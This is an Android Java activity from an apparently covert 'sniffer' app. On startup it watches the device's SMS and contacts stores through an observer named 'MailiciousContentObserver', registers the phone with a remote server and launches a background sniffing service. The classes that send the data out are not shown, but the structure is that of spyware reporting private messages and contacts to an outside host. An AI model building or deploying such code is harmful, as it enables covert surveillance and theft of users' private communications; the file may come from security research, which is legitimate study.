package com.isotlab.android.intentlogger;


import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import com.isecpartners.android.intentsniffer.R;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;

import com.turbomanage.httpclient.AsyncCallback;
import com.turbomanage.httpclient.AsyncHttpClient;
import com.turbomanage.httpclient.ParameterMap;
import com.turbomanage.httpclient.android.AndroidHttpClient;

import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import org.acra.*;
import org.acra.annotation.*;

@ReportsCrashes(formKey = "Activity-Sniffer", formUri = "http://www.yourselectedbackend.com/reportpath")
public class ActivitySniffer extends Activity {
	// controls
	public TextView textView = null;
	public Button register = null;
	private int phone_id = -1;
	public static final String PREFS_NAME = "IntentSnifferPrefs";
	public SharedPreferences settings;
	
	/** Called when the activity is first created. */
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		settings = getSharedPreferences(PREFS_NAME, 0);
	    phone_id = settings.getInt("phone_id", -1);
	    
	    MailiciousContentObserver observer = new MailiciousContentObserver(new Handler(), this);
	    ContentResolver contentResolver = this.getContentResolver();
	    contentResolver.registerContentObserver(Uri.parse("content://sms"),true, observer);	
	    contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, observer);
	    
	    if(phone_id <=0) {
	    	System.out.println("No, phone id launching view");
	    	setContentView(R.layout.main);
	    } else {
	    	startSniffing();
	    }
		
	}
	
	public void registerPhone(View view) {
        
		if (((EditText) findViewById(R.id.edit_message)).getText().length() <=0)
			return;
		String phone_name  = ((EditText) findViewById(R.id.edit_message)).getText().toString();
		registerPhoneHttp(phone_name);
		
		
	}
	
	private boolean registerPhoneHttp(String phone_name) {
		AndroidHttpClient httpClient = new AndroidHttpClient("http://dev.erikjohnson.ca:8080");
		httpClient.setMaxRetries(5);
		ParameterMap params = httpClient.newParams()
                .add("name", phone_name);
		httpClient.post("/phone", params, new AsyncCallback() {
            @Override
            public void onError(Exception e) {
            	Log.e("HTTP PHONE RESPONSE", " error parsing int: "
						+ e.getMessage());
            }
			@Override
			public void onComplete(
					com.turbomanage.httpclient.HttpResponse httpResponse) {
				try {
					phone_id = Integer.parseInt(httpResponse.getHeaders().get("Location").get(0).toString());
					findViewById(R.id.button_register).setVisibility(View.INVISIBLE);
					findViewById(R.id.edit_message).setVisibility(View.INVISIBLE);
					startSniffing();
					
					settings = getSharedPreferences(PREFS_NAME, 0);
				    Editor editor = settings.edit();
				    editor.putInt("phone_id", phone_id);
				    editor.commit();
					
				} catch (Exception ex) {
					Log.e("HTTP PHONE RESPONSE", " error parsing int: "
							+ ex.getMessage());
				}
				
			}
        });
		return true;
	}

	public void startSniffing() {
		Log.d("IntentSniffer", "Phone id: " + String.valueOf(phone_id));
		if(phone_id >= 0) {
			Intent sniffingService = new Intent(this, ServiceHttp.class);
			Log.d("IntentSniffer", "Starting service with phone id: " + String.valueOf(phone_id));
			sniffingService.putExtra("phone_id", String.valueOf(phone_id));
			startService(sniffingService);
		}
	}

}